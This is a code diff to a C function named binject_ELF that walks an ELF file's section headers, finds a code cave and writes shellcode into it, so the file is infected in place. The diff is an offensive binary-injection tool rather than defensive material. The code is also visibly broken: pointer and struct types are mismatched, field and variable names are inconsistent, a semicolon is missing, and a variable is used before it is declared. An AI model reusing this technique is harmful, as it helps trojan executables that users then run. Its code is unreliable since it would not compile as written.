@@ -8,13 +8,28 @@ int binject_ELF(char *file,char *shellcode,int method)
   fseek(f,0,SEEK_END);
  size=ftell(f);
   char *file_buffer = calloc(1,size);
+  char *address=file_buffer;
+  struct Elf32_Ehdr ehdr=(struct Elf32_Ehdr*)address;
   if(method==CODE_CAVE)
   {
-  for(i=0;i<sections;i++)
-  {
+	  address+=ehdr->sh_offset;
+  for(i=0;i<ehdr.shnum;i++)
+  {       
+	  struct Elf32_shdr shdr=(struct Elf32_Shdr*)address;
+	  uint32_t section_start=Shdr->sh_offset;
+	  uint32_t section_end=Shdr->sh_offset + shdr->sh_size;
        x=find_code_cave(sclen,section_start,section_end,file_buffer);
                         if(x!=0)
-                        break;
+			{
+                        memcpy(file_buffer+x,shellcodefixed,sclen+5)
+			fwrite(file_buffer,1,size,f);
+			free(shellcodefixed);
+			free(file_buffer);
+			fclose(f);
+			return 0;
+		        
+			}
+				section_start+=shdr->sh_size;
   }
                         if(x!=0)
                         return 1;
